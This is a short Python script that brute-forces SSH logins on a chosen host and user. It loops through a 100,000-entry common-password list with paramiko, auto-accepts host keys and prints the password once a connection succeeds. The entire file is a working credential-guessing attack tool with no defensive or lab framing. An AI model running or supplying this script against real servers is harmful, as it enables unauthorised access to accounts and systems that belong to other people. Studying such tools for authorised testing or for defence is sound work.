import pwn
import paramiko

hostname = input("Host name: ")
port = 22
username = input("User name: ")
attempts = 0

with open("10-million-password-list-top-100000.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        attempts += 1
        print("[{}] Attempting password: [{}]".format(attempts, password))

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            client.connect(hostname, port, username, password)
            print("Connection successful! Password:", password)
            break  
        except paramiko.AuthenticationException:
            print("Incorrect password:", password)
        except paramiko.SSHException as e:
            print("An error occurred while establishing SSH connection:", e)
        finally:
            client.close()
